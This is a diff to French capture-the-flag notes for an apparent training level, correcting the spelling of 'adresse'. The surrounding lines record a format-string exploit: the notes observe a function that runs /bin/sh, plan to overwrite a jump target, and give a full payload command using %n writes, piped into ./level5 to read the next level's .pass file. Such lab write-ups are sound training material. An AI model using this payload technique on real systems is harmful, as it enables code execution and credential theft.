@@ -62,7 +62,7 @@ outils:
 
 observations:
 	Il y a une fonction <o> qui execute "/bin/sh"
-	Probablement modifier la stack de printf pour changer son addresse de retour vu que nous n'avons pas d'insttuction de retour
+	Probablement modifier la stack de printf pour changer son adresse de retour vu que nous n'avons pas d'insttuction de retour
 	dans les autres fonctions (ca va etre fastidieux)
 	Appel a fonction <exit> et fonction <_exit>
 
@@ -79,7 +79,7 @@ cmd gdb:
 
 
 solution:
-	Je vais modifier l'addresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'addresse de la fonction <o>
+	Je vais modifier l'adresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'adresse de la fonction <o>
 
 cmd:
 	(python -c "print('\x38\x98\x04\x08' + 'A'*4 + '\x39\x98\x04\x08' + 'A'*4 + '\x3a\x98\x04\x08' + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
